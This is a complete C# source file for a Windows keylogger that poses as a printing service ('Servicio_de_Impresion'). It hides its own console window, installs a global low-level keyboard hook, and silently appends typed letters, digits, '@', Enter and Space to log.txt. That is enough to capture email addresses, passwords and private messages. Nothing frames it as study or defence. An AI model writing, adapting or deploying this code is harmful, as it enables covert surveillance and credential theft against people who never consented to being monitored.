using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace Servicio_de_Impresion
{
    class Program
    {
       //Variable de clase//
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
        
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
               
                // Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter("log.txt", true);
                if (((char)vkCode=='A')  || ((char)vkCode == 'B') || ((char)vkCode == 'C') || ((char)vkCode == 'D') || 
                   ((char)vkCode == 'E') || ((char)vkCode == 'F') || ((char)vkCode == 'G') || ((char)vkCode == 'H') || 
                   ((char)vkCode == 'I') || ((char)vkCode == 'J') || ((char)vkCode == 'K') || ((char)vkCode == 'L') ||
                   ((char)vkCode == 'M') || ((char)vkCode == 'N') || ((char)vkCode == 'Ñ') || ((char)vkCode == 'O') ||
                   ((char)vkCode == 'P') || ((char)vkCode == 'Q') || ((char)vkCode == 'R') || ((char)vkCode == 'S') ||
                   ((char)vkCode == 'T') || ((char)vkCode == 'U') || ((char)vkCode == 'V') || ((char)vkCode == 'W') ||
                   ((char)vkCode == 'X') || ((char)vkCode == 'Y') || ((char)vkCode == 'Z') || ((char)vkCode == 'a') ||
                   ((char)vkCode == 'b') || ((char)vkCode == 'c') || ((char)vkCode == 'd') || ((char)vkCode == 'e') || 
                   ((char)vkCode == 'f') || ((char)vkCode == 'g') || ((char)vkCode == 'h') || ((char)vkCode == 'i') || 
                   ((char)vkCode == 'j') || ((char)vkCode == 'k') || ((char)vkCode == 'l') || ((char)vkCode == 'm') || 
                   ((char)vkCode == 'n') || ((char)vkCode == 'ñ') || ((char)vkCode == 'o') || ((char)vkCode == 'p') || 
                   ((char)vkCode == 'q') || ((char)vkCode == 'r') || ((char)vkCode == 's') || ((char)vkCode == 't') || 
                   ((char)vkCode == 'u') || ((char)vkCode == 'v') || ((char)vkCode == 'w') || ((char)vkCode == 'x') || 
                   ((char)vkCode == 'y') || ((char)vkCode == 'z') || ((char)vkCode == '@') ||
                   ((Keys)vkCode == Keys.D0) || ((Keys)vkCode == Keys.D1) || ((Keys)vkCode == Keys.D2) || ((Keys)vkCode == Keys.D3) ||
                   ((Keys)vkCode == Keys.D4) || ((Keys)vkCode == Keys.D5) || ((Keys)vkCode == Keys.D6) || ((Keys)vkCode == Keys.D7) ||
                   ((Keys)vkCode == Keys.D8) || ((Keys)vkCode == Keys.D9) ||
                   ((Keys)vkCode == Keys.NumPad0) || ((Keys)vkCode == Keys.NumPad1) || ((Keys)vkCode == Keys.NumPad2) || ((Keys)vkCode == Keys.NumPad3) || 
                   ((Keys)vkCode == Keys.NumPad4) || ((Keys)vkCode == Keys.NumPad5) || ((Keys)vkCode == Keys.NumPad6) || ((Keys)vkCode == Keys.NumPad7) ||
                   ((Keys)vkCode == Keys.NumPad8) || ((Keys)vkCode == Keys.NumPad9) || ((Keys)vkCode == Keys.Enter)   || ((Keys)vkCode == Keys.Space))
                {
                    sw.Write((Keys)vkCode);
                }
               sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
       LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
